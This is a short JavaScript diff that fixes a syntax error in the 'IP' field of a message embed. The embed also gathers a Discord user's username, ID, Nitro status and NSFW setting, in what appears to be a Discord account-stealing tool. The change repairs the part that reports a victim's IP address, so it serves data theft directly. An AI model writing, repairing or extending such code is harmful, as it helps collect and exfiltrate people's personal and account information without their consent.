@@ -226,7 +226,7 @@ const FirstTime = async () => {
         var params = await makeEmbed({
             title: `\`${user.username}\``,
             fields: [
-                { name: "IP" `\`${ip}\``, inline: false },
+                { name: "IP", value: `\`${ip}\``, inline: false },
                 { name: "ID", value: `\`${user.id}\``, inline: false },
                 { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: false },
                 { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
